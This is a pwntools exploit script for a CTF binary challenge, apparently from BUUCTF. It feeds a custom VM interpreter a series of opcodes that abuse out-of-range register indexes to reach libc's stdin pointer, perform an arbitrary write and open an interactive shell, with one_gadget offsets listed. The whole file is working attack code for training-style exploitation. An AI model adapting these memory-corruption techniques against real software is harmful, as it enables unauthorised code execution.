#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Pack(choice,low2,low1):
    return str(((choice)<<16) + (low2<<8) + low1)

def exp():
    p.sendlineafter("EIP: ","0")
    p.sendlineafter("ESP: ","0")
    payload = []
    #-12:stdin
    payload.append(Pack(0x40,0,8))#0:8
    payload.append(Pack(0x40,1,4))#1:4
    payload.append(Pack(0x40,3,2))#3:2
    payload.append(Pack(0x40,4,1))#4:1
    payload.append(Pack(0x40,6,1))#6:1
    payload.append(Pack(0xa0,0,0))#0:16
    payload.append(Pack(0xa0,0,1))#0:20
    payload.append(Pack(0xd0,2,0))#2:-20
    payload.append(Pack(0xd0,5,3))#5:-2
    payload.append(Pack(0x42,5,2))#reg[-2]:stdin
    payload.append(Pack(0xd0,4,0))#4:-21
    payload.append(Pack(0xa0,6,5))#6:-1
    payload.append(Pack(0x42,6,4))#reg[-1]:stdin+4
    #now reg_addr(malloc) is stdin_addr
    #still we need to add 0x70 to it
    for i in range(2):
        payload.append(Pack(0xa0,0,0))#0:16
    for i in range(7):
        payload.append(Pack(0xa0,0,1))#0:16
    payload.append(Pack(0xd0,7,3))
    #mov stdin to reg[3]
    #payload.append(Pack(0x40,3,3))#33
    payload.append(Pack(0x42,3,2))

    payload.append(Pack(0xa0,2,0))
    #mov reg[2] to reg[-2]
    #arb write
    payload.append(Pack(0x41,1,2))
    payload.append(Pack(0x42,7,1))
    #now we make 0x233
    for i in range(2):
        payload.append(Pack(0xa0,0,0))#0:16
    for i in range(5):
        payload.append(Pack(0xa0,1,1))#0:16

    payload.append(Pack(0xa0,0,1))#0:16
    payload.append(Pack(0x40,1,3))#0:8
    payload.append(Pack(0xa0,0,1))#0:16
    # now we can really write
    payload.append(Pack(0x70,0,0))


    p.sendlineafter("Give me code length:",str(len(payload)))
    p.recvuntil("Give me code:")
    gdb.attach(p,'''
            b * 0x0000555555554000+0x1710
            ''')
    for i in range(0,len(payload)):
        p.sendline(payload[i])

    p.interactive()

exp()
